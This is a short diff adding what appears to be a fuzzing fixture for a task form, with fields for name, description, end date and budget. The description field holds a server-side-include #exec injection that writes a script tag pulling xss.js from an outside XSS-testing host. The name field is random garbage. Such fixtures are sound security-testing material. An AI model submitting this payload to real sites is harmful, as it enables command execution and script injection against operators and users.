@@ -1,0 +1,6 @@
+name : R0'gR'.U :'.'K.'5 97U ':.94
+desc : <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+end : 19.7.2016
+budget : 4,468
+assignto[] : 1
+assignme : 1
